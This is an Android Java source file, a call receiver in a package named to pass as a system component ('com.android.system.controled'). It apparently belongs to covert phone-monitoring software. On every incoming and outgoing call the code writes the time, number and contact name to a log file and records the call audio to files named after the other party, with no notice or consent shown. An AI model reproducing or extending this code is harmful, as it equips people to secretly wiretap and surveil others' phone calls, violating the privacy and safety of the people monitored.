package com.android.system.controled.receiver;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.android.system.controled.MainApplication;
import com.android.system.controled.util.ContactsUtil;
import com.android.system.controled.util.FileUtil;
import com.android.system.controled.util.InitUtil;
import com.android.system.controled.util.RecorderUtil;
import com.android.system.controled.util.StringUtil;
import com.android.system.controled.util.TimeUtil;

public class CallReceiver extends BroadcastReceiver {

	private static final String TAG = "CallReceiver";

	private TelephonyManager tm;
	private MyListenner ml;
	
	@Override
	public void onReceive(Context context, Intent intent) {

		InitUtil.init(context);

		if (tm == null) {
			tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
		}
		if (ml == null) {
			ml = new MyListenner(context);
		}

		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
			FileUtil.writeFile("去电：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(context, getResultData()) + ":" + getResultData(), MainApplication.FILE_CALL_LOG, true);
			startRecord(context, getResultData(), "去电");
		} else {
			tm.listen(ml, PhoneStateListener.LISTEN_CALL_STATE);
		}

	}

	private class MyListenner extends PhoneStateListener {

		private Context con;

		public MyListenner(Context c) {
			this.con = c;
		}

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			// state 当前状态 incomingNumber,貌似没有去电的API
			super.onCallStateChanged(state, incomingNumber);

			switch (state) {

			case TelephonyManager.CALL_STATE_IDLE:
				FileUtil.writeFile("\r\n挂断：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "\r\n\r\n", MainApplication.FILE_CALL_LOG, true);
				stopRecord(con);
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK:
				FileUtil.writeFile("\r\n接听：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()), MainApplication.FILE_CALL_LOG, true);
				break;
			case TelephonyManager.CALL_STATE_RINGING:
				FileUtil.writeFile("来电：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(con, incomingNumber) + ":" + incomingNumber, MainApplication.FILE_CALL_LOG, true);
				startRecord(con, incomingNumber, "来电");
				break;
			}

			tm.listen(ml, PhoneStateListener.LISTEN_NONE);
		}

	}

	/**
	 * 开始录音
	 * 
	 * @Description:
	 * @param con
	 * @param number
	 * @param type
	 *            来电或去电
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-7-19
	 */
	private void startRecord(Context con, String number, String type) {
		// 根据号码获得姓名，姓名要过滤特殊字符
		String name = StringUtil.getRidofSpecialOfFileName(ContactsUtil.getNameFromContactsByNumber(con, number));

		// 文件保存位置
		String fileName = MainApplication.FILEPATH_AUDIOS_CALL + type + "_" + name + "_" + number + "_" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis());
		RecorderUtil.getInstence(con).startRecorder(fileName, -1);
	}

	private void stopRecord(Context con) {
		RecorderUtil.getInstence(con).stopRecorder();
	}
}
